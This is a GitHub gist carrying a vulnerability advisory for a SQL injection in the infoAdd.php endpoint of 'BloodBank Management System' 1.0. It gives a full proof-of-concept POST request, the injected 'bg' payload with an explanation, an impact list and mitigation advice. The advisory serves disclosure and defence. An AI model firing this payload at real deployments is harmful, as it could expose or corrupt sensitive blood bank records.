
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F25a103a1fe84c4db4530e68d2f998d11)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F25a103a1fe84c4db4530e68d2f998d11&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F25a103a1fe84c4db4530e68d2f998d11) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F25a103a1fe84c4db4530e68d2f998d11&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@higordiego](https://avatars.githubusercontent.com/u/10968610?s=64&v=4)](/higordiego)

# [higordiego](/higordiego)/**[sqli\_info\_add.md](/higordiego/25a103a1fe84c4db4530e68d2f998d11)** Secret

Created
October 25, 2024 21:14

Show Gist options

* [Download ZIP](/higordiego/25a103a1fe84c4db4530e68d2f998d11/archive/dd47f65fbca703759c2dfa9eccc1b80ddd960f62.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F25a103a1fe84c4db4530e68d2f998d11)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F25a103a1fe84c4db4530e68d2f998d11)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/higordiego/25a103a1fe84c4db4530e68d2f998d11.js&quot;&gt;&lt;/script&gt;
* Save higordiego/25a103a1fe84c4db4530e68d2f998d11 to your computer and use it in GitHub Desktop.

[Code](/higordiego/25a103a1fe84c4db4530e68d2f998d11)
[Revisions
1](/higordiego/25a103a1fe84c4db4530e68d2f998d11/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/higordiego/25a103a1fe84c4db4530e68d2f998d11.js&quot;&gt;&lt;/script&gt;

Save higordiego/25a103a1fe84c4db4530e68d2f998d11 to your computer and use it in GitHub Desktop.

[Download ZIP](/higordiego/25a103a1fe84c4db4530e68d2f998d11/archive/dd47f65fbca703759c2dfa9eccc1b80ddd960f62.zip)

 [Raw](/higordiego/25a103a1fe84c4db4530e68d2f998d11/raw/dd47f65fbca703759c2dfa9eccc1b80ddd960f62/sqli_info_add.md)

[**sqli\_info\_add.md**](#file-sqli_info_add-md)

## **Affected Version:**

* **BloodBank Management System**: 1.0

## **Vulnerability Information:**

* **Vulnerability Type:** SQL Injection (Logical Blind)
* **Severity:** HIGH
* **Status:** Unpatched

## **Vulnerable Endpoint:**

* **Path:** `/file/infoAdd.php`

## **Vulnerability Description:**

A **SQL Injection vulnerability** was identified in the **infoAdd functionality** of the **BloodBank Management System** version 1.0. This vulnerability occurs during the creation of blood-related information, specifically when user inputs are not sanitized before being used in SQL queries.

The PoC shows that **malicious SQL commands can be injected into the request body** through parameters such as `bg` (blood group). This allows attackers to manipulate the backend query logic to extract or modify data. Using **blind logical injection techniques**, the attack ensures successful exploitation by validating the logic embedded within the SQL query.

---

## **Proof of Concept (PoC):**

Below is an example of a **POST** request that injects SQL commands via the `bg` parameter:

```
POST /file/infoAdd.php HTTP/1.1
Host: localhost:8080
Content-Length: 150
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="129", "Not=A?Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Origin: http://localhost:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/bloodinfo.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=48068ce7875c00d88ca3aa2b9269b91f
Connection: keep-alive

condition=agree&bg=A-'%20AND%20GTID_SUBSET(CONCAT(0x71626b6b71%2c(SELECT%20(ELT(5790%3d5790%2c1)))%2c0x716b787171)%2c5790)--%20KHAM%26add%3dAd&add=Add

```
### **Explanation:**

The payload used in the `bg` parameter is:

```
A-' AND GTID_SUBSET(CONCAT(0x71626b6b71, (SELECT (ELT(5790=5790,1))), 0x716b787171), 5790)-- KHAM
```

This query verifies whether **5790=5790** is true (always true) and, if so, returns `1`. The logic embedded in the SQL command allows the attacker to confirm whether the injection was successful. This could be used to **extract sensitive data** through multiple attempts or **manipulate the database**.

---

## Image

* [![](https://camo.githubusercontent.com/81f6e1c52fea5b53cbd5989dffe18e662c48c9f73cd1fc83908b6689372f0699/68747470733a2f2f692e6962622e636f2f6b4a344a7764392f323032342d31302d32312d32312d30352d696e666f2d6164642e706e67)](https://camo.githubusercontent.com/81f6e1c52fea5b53cbd5989dffe18e662c48c9f73cd1fc83908b6689372f0699/68747470733a2f2f692e6962622e636f2f6b4a344a7764392f323032342d31302d32312d32312d30352d696e666f2d6164642e706e67)
* [![](https://camo.githubusercontent.com/8750fefb2dd3370d688172daf82dd663df73402a2bcfb202c02b0d97e563ecbe/68747470733a2f2f692e6962622e636f2f4e7944474663312f323032342d31302d32312d32302d35382d696e662d6164642e706e67)](https://camo.githubusercontent.com/8750fefb2dd3370d688172daf82dd663df73402a2bcfb202c02b0d97e563ecbe/68747470733a2f2f692e6962622e636f2f4e7944474663312f323032342d31302d32312d32302d35382d696e662d6164642e706e67)

---

## **Impact:**

* **Data Modification:** Attackers could modify or corrupt blood bank records.
* **Information Disclosure:** Sensitive data could be exfiltrated using similar SQL payloads.
* **System Integrity Risks:** Unchecked SQL injections could compromise the entire database and potentially provide full access to attackers.
* **Denial of Service (DoS):** Repeated exploitation of the system may degrade performance.

---

## **Mitigation Recommendations:**

1. **Use Prepared Statements:** Replace dynamic SQL queries with parameterized ones.
2. **Input Validation:** Validate and sanitize all user inputs, ensuring only expected values are accepted.
3. **Database Permissions:** Limit database user privileges to minimize damage from successful injections.
4. **Monitoring and Alerts:** Enable logging of all SQL-related errors and trigger alerts for suspicious activity.
5. **Penetration Testing:** Regularly test the system for SQL injection vulnerabilities and apply fixes promptly.
6. **Web Application Firewall (WAF):** Deploy a WAF to block malicious requests in real time.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F25a103a1fe84c4db4530e68d2f998d11)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

